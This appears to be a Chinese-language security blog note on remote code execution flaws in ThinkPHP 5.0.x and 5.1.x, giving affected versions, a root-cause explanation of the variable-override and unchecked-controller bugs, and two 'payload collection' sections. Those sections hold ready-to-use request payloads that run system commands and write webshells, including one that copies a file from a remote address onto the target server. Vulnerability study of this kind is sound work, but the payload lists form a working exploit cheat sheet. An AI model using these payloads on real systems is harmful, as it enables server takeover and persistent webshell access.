---
layout: post
title: THINKPTP5_RCE
date: 2022-10-7
categories: blog
tags: [笔记]
description: tp5 rce漏洞 梳理

---

## Thinkphp5.x rce

***

### ThinkPHP5.0.x 变量覆盖RCE

#### 影响版本

`5.0.0 - 5.0.23`

#### 漏洞成因

利用`伪全局变量覆盖`达到命令执行的目的  
在`thinkphp/library/think/Request.php`的`method`方法存在漏洞，可以通过post数组传入`__method`任意调用Request类中的方法  
Request中的`__construct`方法中`foreach`调用可以覆盖Request类中的属性，导致原本的`filter`可以被覆盖成`system`  
Thinkphp5中定义了验证码类路由地址`?s=captcha`，默认这个方法能够调用`Request::instance()->param()`  
执行`$request->param()`会进入`input()`方法，在这个方法中将覆盖的`filter`回调`call_user_func()`，实现rce

理解：`__construct()`中的`$this->$name = $item` 做到类属性任意覆盖，被覆盖的类属性又被用在`call_user_func()`中

5.0.13之后版本默认debug=false 需要开启debug后才能利用此漏洞进行命令执行，可以通过添加路由触发rce

#### payload收集

```php
5.0.1-5.0.13 
//命令执行
POST ?s=index/index
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter

//写shell
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert

5.0.13-5.0.23
//开启debug命令执行
POST ?s=index/index
_method=__construct&filter[]=system&method=GET&s=calc

//无需开启debug命令执行
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
POST ?s=captcha
_method=__construct&filter[]=system&s=calc&method=get
    
//需开启debug写shell
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```

### ThinkPHP5.1.x未开启强制路由

#### 影响版本

`5.1.0 - 5.1.30`

#### 漏洞成因

thinkphp默认未开启强制路由且默认开启路由兼容模式  
兼容模式可以调用控制器(controller)执行，根据前一个RCE漏洞可知所有用户参数都会调用Request::input()  
其会调用filterValue方法，此方法中包含call_user_func

理解：流程中没有对控制器进行合法校验，导致可以调用任意控制器，实现rce

#### payload收集 

```php
#命令执行
5.0.x
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
5.1.x
?s=index/\think\Request/input&filter[]=system&data=pwd
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

#写入webshell
5.0.x
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=copy(%27远程地址%27,%27333.php%27)
5.1.x
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\view\driver\Think/display&template=<?php phpinfo();?>  //shell生成在runtime/temp/md5(template).php
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=copy(%27远程地址%27,%27333.php%27)
```
